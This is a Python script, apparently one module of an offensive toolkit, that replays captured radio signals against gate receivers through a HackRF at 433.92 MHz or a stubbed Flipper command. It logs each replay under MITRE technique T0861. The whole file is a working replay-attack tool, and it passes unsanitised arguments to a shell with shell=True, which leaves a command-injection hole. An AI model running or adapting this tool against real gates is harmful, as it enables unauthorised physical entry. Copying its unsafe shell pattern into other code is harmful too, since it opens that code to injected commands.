# modules/attacks/gate_rf_replay.py

import argparse
import os
import time
import json
from datetime import datetime
import subprocess

LOG_FILE = "results/gate_rf_replay_log.json"
MITRE_TTP = "T0861"

def log_replay(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def replay_rf(signal_file, tool="hackrf", frequency="433920000", rate="2000000"):
    if tool == "hackrf":
        print(f"[+] Replaying {signal_file} via HackRF...")
        cmd = f"hackrf_transfer -t {signal_file} -f {frequency} -s {rate} -x 47"
    elif tool == "flipper":
        print(f"[+] Sending Flipper-compatible replay...")
        cmd = f"flipper_rf_send {signal_file}"  # Stubbed external tool
    else:
        print("[!] Unsupported tool.")
        return

    subprocess.run(cmd, shell=True)

    log_replay({
        "timestamp": datetime.utcnow().isoformat(),
        "signal_file": signal_file,
        "tool": tool,
        "frequency": frequency,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Gate RF Signal Replay Tool")
    parser.add_argument("--signal", required=True, help="Path to RF file (e.g., .bin, .sub)")
    parser.add_argument("--tool", default="hackrf", help="Replay tool: hackrf | flipper")
    parser.add_argument("--freq", default="433920000", help="Frequency to transmit")
    parser.add_argument("--rate", default="2000000", help="Sample rate")
    args = parser.parse_args()

    replay_rf(args.signal, args.tool, args.freq, args.rate)
